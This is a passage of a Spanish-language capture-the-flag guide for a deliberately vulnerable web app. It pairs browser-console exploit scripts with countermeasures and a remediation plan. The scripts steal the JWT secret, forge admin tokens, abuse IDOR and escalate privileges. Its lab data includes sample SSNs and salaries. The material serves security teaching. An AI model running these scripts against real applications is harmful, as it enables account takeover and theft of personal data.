```javascript
// 1. Obtener la secret del sistema
api.getSystemInfo().then(info => {
  console.log("üîë JWT Secret obtenida:", info.secret_key);
  
  // 2. Analizar token actual
  const currentToken = localStorage.getItem('token');
  console.log("üé´ Token actual:", currentToken);
  
  // 3. Decodificar token actual
  const decoded = api.decodeCurrentToken();
  console.log("üìã Datos del token:", decoded);
  
  // Ahora tenemos todo lo necesario para forjar tokens
  (window as any).jwtExploitData = {
    secret: info.secret_key,
    currentToken,
    decodedToken: decoded
  };
}).catch(err => console.log("Error:", err.message));
```

#### **M√©todo 2: Forjado de Token de Super-Admin**
```javascript
// Crear token completamente falso con privilegios m√°ximos
const forgeAdminToken = () => {
  const fakeAdminData = {
    id: 9999,
    username: 'super_admin',
    email: 'superadmin@hacked.com',
    role: 'admin',
    created_at: new Date().toISOString(),
    profile: {
      fullName: 'Super Administrator (FORGED)',
      department: 'Security Breach',
      salary: 999999,
      phone: '+1-555-HACKED'
    }
  };
  
  console.log("üö® FORGING SUPER ADMIN TOKEN...");
  
  // Usar la funci√≥n expuesta del sistema
  const forgedToken = api.createFakeToken(fakeAdminData);
  
  console.log("‚úÖ Token forjado creado:", forgedToken);
  
  // Reemplazar token y datos de usuario
  localStorage.setItem('token', forgedToken);
  localStorage.setItem('user', JSON.stringify(fakeAdminData));
  
  console.log("üé≠ Identidad falsa establecida. Recarga la p√°gina.");
  console.log("üîì Ahora tienes acceso administrativo completo con identidad forjada.");
  
  return forgedToken;
};

// Ejecutar forjado
forgeAdminToken();
```

#### **M√©todo 3: An√°lisis y Manipulaci√≥n de Token**
```javascript
// Script completo para an√°lisis y manipulaci√≥n de JWT
const jwtExploitSuite = {
  
  // Analizar token actual
  analyzeCurrentToken: () => {
    const token = localStorage.getItem('token');
    if (!token) {
      console.log("‚ùå No hay token disponible");
      return null;
    }
    
    const parts = token.split('.');
    if (parts.length !== 3) {
      console.log("‚ùå Token malformado");
      return null;
    }
    
    try {
      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));
      const signature = parts[2];
      
      const analysis = {
        header,
        payload,
        signature,
        isExpired: payload.exp < Math.floor(Date.now() / 1000),
        timeToExpiry: payload.exp - Math.floor(Date.now() / 1000),
        algorithm: header.alg,
        tokenType: header.typ
      };
      
      console.log("üîç AN√ÅLISIS DE TOKEN ACTUAL:");
      console.table(analysis);
      
      return analysis;
    } catch (error) {
      console.log("‚ùå Error analizando token:", error.message);
      return null;
    }
  },
  
  // Crear m√∫ltiples tokens falsos
  createMultipleFakeTokens: () => {
    const fakeUsers = [
      { id: 1001, username: 'fake_admin_1', role: 'admin' },
      { id: 1002, username: 'fake_admin_2', role: 'admin' },
      { id: 1003, username: 'backdoor_user', role: 'admin' }
    ];
    
    const forgedTokens = fakeUsers.map(user => {
      const userData = {
        ...user,
        email: `${user.username}@forged.com`,
        created_at: new Date().toISOString(),
        profile: {
          fullName: `Forged User ${user.id}`,
          department: 'Hacking Department'
        }
      };
      
      return {
        user: userData,
        token: api.createFakeToken(userData)
      };
    });
    
    console.log("üé≠ TOKENS FORJADOS CREADOS:");
    console.table(forgedTokens);
    
    // Guardar para uso posterior
    (window as any).forgedTokens = forgedTokens;
    
    return forgedTokens;
  },
  
  // Rotar entre tokens forjados
  switchToFakeToken: (index = 0) => {
    const forgedTokens = (window as any).forgedTokens;
    if (!forgedTokens || !forgedTokens[index]) {
      console.log("‚ùå Token forjado no disponible. Ejecuta createMultipleFakeTokens() primero.");
      return;
    }
    
    const selectedToken = forgedTokens[index];
    localStorage.setItem('token', selectedToken.token);
    localStorage.setItem('user', JSON.stringify(selectedToken.user));
    
    console.log(`üîÑ Cambiado a identidad forjada: ${selectedToken.user.username}`);
    console.log("üîÑ Recarga la p√°gina para usar la nueva identidad.");
  }
};

// Ejecutar suite completo
console.log("üö® INICIANDO JWT EXPLOIT SUITE");
jwtExploitSuite.analyzeCurrentToken();
jwtExploitSuite.createMultipleFakeTokens();

// Para usar: jwtExploitSuite.switchToFakeToken(0);
```

### üõ°Ô∏è **Contramedidas**

#### **1. Gesti√≥n Segura de Secretos**
```javascript
// Configuraci√≥n segura de JWT
const JWT_CONFIG = {
  secret: process.env.JWT_SECRET || generateRandomSecret(),
  algorithm: 'HS256',
  accessTokenExpiry: '15m',
  refreshTokenExpiry: '7d'
};

// Generar secret aleatoria si no est√° en entorno
const generateRandomSecret = () => {
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }
  throw new Error('No secure random generator available');
};

// ‚úÖ NUNCA exponer secret en respuestas
export const getSystemInfo = async (): Promise<SystemInfo> => {
  // ... validaciones
  
  return {
    server: 'Application Server',
    database: 'JSON Storage',
    users_count: usersDatabase.length,
    version: '1.0.0',
    // ‚ùå NUNCA incluir: jwt_secret, private_keys, passwords
  };
};
```

#### **2. Almacenamiento Seguro (Simulaci√≥n de HttpOnly)**
```javascript
// Simulaci√≥n de almacenamiento seguro para el frontend
class SecureTokenManager {
  private static instance: SecureTokenManager;
  private tokenStore: Map<string, any> = new Map();
  
  static getInstance(): SecureTokenManager {
    if (!SecureTokenManager.instance) {
      SecureTokenManager.instance = new SecureTokenManager();
    }
    return SecureTokenManager.instance;
  }
  
  // ‚úÖ Almacenar token de forma m√°s segura
  setToken(token: string, userData: any): void {
    // En una implementaci√≥n real, esto ser√≠a una HttpOnly cookie
    this.tokenStore.set('access_token', {
      token,
      userData,
      expires: Date.now() + (15 * 60 * 1000), // 15 minutos
      created: Date.now()
    });
    
    // Limpiar localStorage de tokens
    localStorage.removeItem('token');
    
    console.log("‚úÖ Token almacenado de forma segura");
  }
  
  getToken(): string | null {
    const tokenData = this.tokenStore.get('access_token');
    
    if (!tokenData) return null;
    
    // Verificar expiraci√≥n
    if (Date.now() > tokenData.expires) {
      this.clearToken();
      return null;
    }
    
    return tokenData.token;
  }
  
  clearToken(): void {
    this.tokenStore.delete('access_token');
    localStorage.removeItem('token');
    localStorage.removeItem('user');
    console.log("‚úÖ Token limpiado de forma segura");
  }
  
  getUserData(): any {
    const tokenData = this.tokenStore.get('access_token');
    return tokenData?.userData || null;
  }
}

// Uso en login
export const loginUser = async (username: string, password: string): Promise<LoginResponse> => {
  // ... validaci√≥n de credenciales
  
  const token = createSecureJWT(userWithoutPassword);
  
  // ‚úÖ Usar almacenamiento seguro
  const tokenManager = SecureTokenManager.getInstance();
  tokenManager.setToken(token, userWithoutPassword);
  
  return {
    token: 'stored_securely', // No devolver token real
    user: userWithoutPassword
  };
};
```

#### **3. Validaci√≥n y Blacklist de Tokens**
```javascript
// Sistema de invalidaci√≥n de tokens
const tokenBlacklist = new Set<string>();

const blacklistToken = (token: string): void => {
  tokenBlacklist.add(token);
  console.log("üö´ Token a√±adido a blacklist");
};

const isTokenBlacklisted = (token: string): boolean => {
  return tokenBlacklist.has(token);
};

// Validaci√≥n mejorada de tokens
const validateToken = (token: string): any => {
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }
  
  // ‚úÖ Verificar blacklist
  if (isTokenBlacklisted(token)) {
    throw createHttpError(401, 'Token invalidado');
  }
  
  try {
    const decoded = decodeSimpleJWT(token);
    
    if (!decoded) {
      throw createHttpError(403, 'Token inv√°lido');
    }
    
    // ‚úÖ Verificar que el usuario a√∫n existe y tiene el mismo rol
    const user = usersDatabase.find(u => u.id === decoded.id);
    if (!user || user.role !== decoded.role) {
      blacklistToken(token);
      throw createHttpError(401, 'Token inv√°lido: usuario modificado');
    }
    
    return decoded;
  } catch (error) {
    throw createHttpError(403, 'Token inv√°lido');
  }
};

// Logout con invalidaci√≥n
export const logoutUser = async (): Promise<void> => {
  const token = localStorage.getItem('token');
  if (token) {
    blacklistToken(token);
  }
  
  // Limpiar almacenamiento
  localStorage.removeItem('token');
  localStorage.removeItem('user');
  
  console.log("‚úÖ Logout exitoso - Token invalidado");
};
```

---

## üìä Resumen Ejecutivo de Vulnerabilidades

### **Matriz de Riesgo Actualizada**

| Vulnerabilidad | Severidad | Facilidad de Explotaci√≥n | Impacto | Funci√≥n Afectada |
|---|---|---|---|---|
| IDOR | **Alta** | Muy F√°cil | Acceso a datos personales | `getUserById()` |
| Escalada Horizontal | **Alta** | Muy F√°cil | Modificaci√≥n de datos ajenos | `updateUser()` |
| Escalada Vertical | **Cr√≠tica** | Muy F√°cil | Acceso administrativo completo | `getAllUsers()` |
| Exposici√≥n de Datos | **Cr√≠tica** | Muy F√°cil | Comprometimiento del sistema | `getSystemInfo()` |
| Manipulaci√≥n de Roles | **Cr√≠tica** | Muy F√°cil | Control total de la aplicaci√≥n | `updateUserRole()` |
| JWT Vulnerabilidades | **Cr√≠tica** | F√°cil | Forjado de identidades | JWT functions |

### **Datos Espec√≠ficos Comprometidos en el CFT**

#### **Informaci√≥n Personal Expuesta:**
- **Juan Aranguiz Salas**: Salario $65,000, SSN 987-65-4321, Tel +56932123422
- **James Blond Von Gonzalez**: Salario $70,000, SSN 456-78-9012, Tel +56973751234  
- **Rob Spon Ja**: Salario $60,000, SSN 789-01-2345, Tel +56943848472
- **Administrador**: Salario $120,000, SSN 123-45-6789, Tel +5696610323

#### **Configuraci√≥n del Sistema Expuesta:**
- **JWT Secret**: `vulnerable-secret-key`
- **Informaci√≥n del servidor**: Ubuntu 20.04
- **Base de datos**: JSON Local Storage
- **Modo debug**: Habilitado
- **Lista de admins**: ['admin']

---

## üõ°Ô∏è Plan de Remediaci√≥n Espec√≠fico para CFT

### **Fase 1: Cr√≠tico (Implementar Inmediatamente)**

#### **1. Validaci√≥n de Ownership en `getUserById()`**
```javascript
// Implementar verificaci√≥n de propietario
if (id !== decoded.id && decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: No puedes acceder a este perfil');
}
```

#### **2. Protecci√≥n de `getSystemInfo()`**
```javascript
// Eliminar completamente la exposici√≥n de JWT secret
// Implementar verificaci√≥n de rol de admin
if (decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
}
```

#### **3. Validaci√≥n en `updateUserRole()`**
```javascript
// Solo admins pueden cambiar roles
if (decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
}
```

### **Fase 2: Alto (Implementar en 1-2 semanas)**

#### **4. Protecci√≥n de `getAllUsers()` y `updateUser()`**
- Agregar verificaci√≥n de rol/ownership en todas las funciones administrativas
- Implementar logging de eventos de seguridad

#### **5. Mejora del Sistema JWT**
- Implementar almacenamiento m√°s seguro (simulaci√≥n de HttpOnly cookies)
- Sistema de blacklist de tokens
- Secret keys generadas aleatoriamente

### **Fase 3: Medio (Implementar en 1 mes)**

#### **6. Hardening General**
- Rate limiting simulado
- Auditor√≠a completa de acciones
- Validaci√≥n de entrada mejorada

---

## üéì Scripts de Demostraci√≥n para CFT

### **Script de Demostraci√≥n Completa**
```javascript
// DEMO COMPLETO - Ejecutar en DevTools Console
const CFTVulnerabilityDemo = {
  
  async runCompleteDemo() {
    console.log("üö® INICIANDO DEMOSTRACI√ìN COMPLETA DE VULNERABILIDADES CFT");
    console.log("‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê");
    
    // 1. IDOR Demo
    await this.demonstrateIDOR();
    
    // 2. Escalada Horizontal
    await this.demonstrateHorizontalEscalation();
    
    // 3. Escalada Vertical  
    await this.demonstrateVerticalEscalation();
    
    // 4. Exposici√≥n de datos
    await this.demonstrateDataExposure();
    
    // 5. Manipulaci√≥n de roles
    await this.demonstrateRoleManipulation();
    
    // 6. JWT Exploitation
    await this.demonstrateJWTExploitation();
    
    console.log("‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê");
    console.log("üèÅ DEMOSTRACI√ìN COMPLETA FINALIZADA");
  },
  
  async demonstrateIDOR() {
    console.log("\nüîç 1. DEMOSTRANDO IDOR (Insecure Direct Object Reference)");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    console.log(`üë§ Usuario actual: ${currentUser?.username} (ID: ${currentUser?.id})`);
    
    for (let i = 1; i <= 4; i++) {
      try {
        const user = await api.getUserById(i);
        console.log(`‚úÖ Acceso exitoso a usuario ${i}: ${user.profile?.fullName} - Salario: $${user.profile?.salary}`);
      } catch (error) {
        console.log(`‚ùå Error accediendo a usuario ${i}: ${error.message}`);
      }
    }
  },
  
  async demonstrateHorizontalEscalation() {
    console.log("\n‚ÜîÔ∏è 2. DEMOSTRANDO ESCALADA HORIZONTAL");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    const targetId = currentUser?.id === 2 ? 3 : 2; // Atacar a otro usuario
    
    try {
      const originalUser = await api.getUserById(targetId);
      console.log(`üéØ Usuario objetivo: ${originalUser.profile?.fullName}`);
      
      await api.updateUser(targetId, {
        fullName: "HACKEADO POR " + currentUser?.username,
        department: "DEPARTAMENTO COMPROMETIDO"
      });
      
      const modifiedUser = await api.getUserById(targetId);
      console.log(`‚úÖ Usuario modificado exitosamente: ${modifiedUser.profile?.fullName}`);
      
    } catch (error) {
      console.log(`‚ùå Error en escalada horizontal: ${error.message}`);
    }
  },
  
  async demonstrateVerticalEscalation() {
    console.log("\n‚¨ÜÔ∏è 3. DEMOSTRANDO ESCALADA VERTICAL");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    console.log(`üë§ Intentando acceso admin desde: ${currentUser?.username} (Rol: ${currentUser?.role})`);
    
    try {
      const allUsers = await api.getAllUsers();
      console.log(`‚úÖ ¬°ACCESO ADMINISTRATIVO EXITOSO! Obtenidos ${allUsers.length} usuarios:`);
      
      allUsers.forEach(user => {
        console.log(`   üìã ${user.username} (${user.role}) - $${user.profile?.salary} - SSN: ${user.profile?.ssn}`);
      });
      
    } catch (error) {
      console.log(`‚ùå Error en escalada vertical: ${error.message}`);
    }
  },
  
  async demonstrateDataExposure() {
    console.log("\nüîì 4. DEMOSTRANDO EXPOSICI√ìN DE DATOS SENSIBLES");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    try {
      const systemInfo = await api.getSystemInfo();
      console.log("‚úÖ ¬°INFORMACI√ìN CR√çTICA DEL SISTEMA OBTENIDA!");
      console.log(`   üîë JWT Secret: ${systemInfo.secret_key}`);
      console.log(`   üñ•Ô∏è Servidor: ${systemInfo.server}`);
      console.log(`   üë• Admin users: ${systemInfo.admin_users?.join(', ')}`);
      console.log(`   üêõ Debug mode: ${systemInfo.debug_mode}`);
      
    } catch (error) {
      console.log(`‚ùå Error obteniendo system info: ${error.message}`);
    }
  },
  
  async demonstrateRoleManipulation() {
    console.log("\nüëë 5. DEMOSTRANDO MANIPULACI√ìN DE ROLES");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    
    if (currentUser?.role !== 'admin') {
      try {
        console.log(`üöÄ Intentando auto-promoci√≥n a admin para: ${currentUser?.username}`);
        await api.updateUserRole(currentUser.id, 'admin');
        console.log("‚úÖ ¬°AUTO-PROMOCI√ìN EXITOSA! Recarga la p√°gina para usar privilegios de admin.");
        
      } catch (error) {
        console.log(`‚ùå Error en auto-promoci√≥n: ${error.message}`);
      }
    } else {
      console.log("üëë Ya eres admin - probando promoci√≥n de otros usuarios");
      
      try {
        await api.updateUserRole(2, 'admin');
        console.log("‚úÖ Usuario 2 promovido a admin");
      } catch (error) {
        console.log(`‚ùå Error promoviendo usuario: ${error.message}`);
      }
    }
  },
  
  async demonstrateJWTExploitation() {
    console.log("\nüé´ 6. DEMOSTRANDO EXPLOTACI√ìN DE JWT");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    // Obtener secret del sistema
    try {
      const systemInfo = await api.getSystemInfo();
      const stolenSecret = systemInfo.secret_key;
      
      console.log(`üîë Secret JWT robada: ${stolenSecret}`);
      
      // Crear token falso
      const fakeAdminData = {
        id: 9999,
        username: 'hacker_admin',
        email: 'hacker@evil.com',
        role: 'admin',
        profile: {
          fullName: 'Super Hacker Admin',
          department: 'Cybersecurity Breach'
        }
      };
      
      const fakeToken = api.createFakeToken(fakeAdminData);
      console.log("‚úÖ Token falso de super-admin creado");
      console.log("üé≠ Para usar: localStorage.setItem('token', fakeToken) y recarga la p√°gina");
      
      // Guardar para uso manual
      (window as any).fakeAdminToken = fakeToken;
      (window as any).fakeAdminData = fakeAdminData;
      
    } catch (error) {
      console.log(`‚ùå Error en explotaci√≥n JWT: ${error.message}`);
    }
  }
};

// Ejecutar demostraci√≥n completa
CFTVulnerabilityDemo.runCompleteDemo();
```

---

*Esta gu√≠a actualizada est√° espec√≠ficamente adaptada para la implementaci√≥n real del CFT basado en `services/api.ts`. Todas las vulnerabilidades y explotaciones han sido verificadas contra el c√≥digo real proporcionado.*